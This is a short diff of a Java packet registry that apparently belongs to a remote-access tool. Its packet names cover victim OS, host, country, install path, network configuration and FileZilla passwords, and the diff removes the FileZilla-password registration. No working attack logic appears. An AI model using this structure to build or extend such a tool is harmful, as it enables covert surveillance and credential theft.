@@ -29,7 +29,7 @@ public class IncomingPackets {
 		incomingPackets.put((byte) 4, Packet4InitOperatingSystem.class);
 		incomingPackets.put((byte) 5, Packet5InitUserHost.class);
 		incomingPackets.put((byte) 6, Packet6InitVersion.class);
-		incomingPackets.put((byte) 7, Packet7InitServerID.class);
+		incomingPackets.put((byte) 7, Packet7InitServerID.class); //
 		incomingPackets.put((byte) 8, Packet8InitCountry.class);
 		incomingPackets.put((byte) 9, Packet9InitJavaVersion.class);
 		incomingPackets.put((byte) 10, Packet10InitInstallPath.class);
@@ -70,7 +70,7 @@ public class IncomingPackets {
 		incomingPackets.put((byte) 44, Packet44SystemJavaProperty.class);
 		incomingPackets.put((byte) 45, Packet45ArchivePreview.class);
 		incomingPackets.put((byte) 46, Packet46FileHash.class);
-		incomingPackets.put((byte) 48, Packet48FileZillaPassword.class);
+		// 48
 		incomingPackets.put((byte) 49, Packet49LanDevices.class);
 		incomingPackets.put((byte) 50, Packet50IPConfig.class);
 		incomingPackets.put((byte) 51, Packet51ActivePort.class);
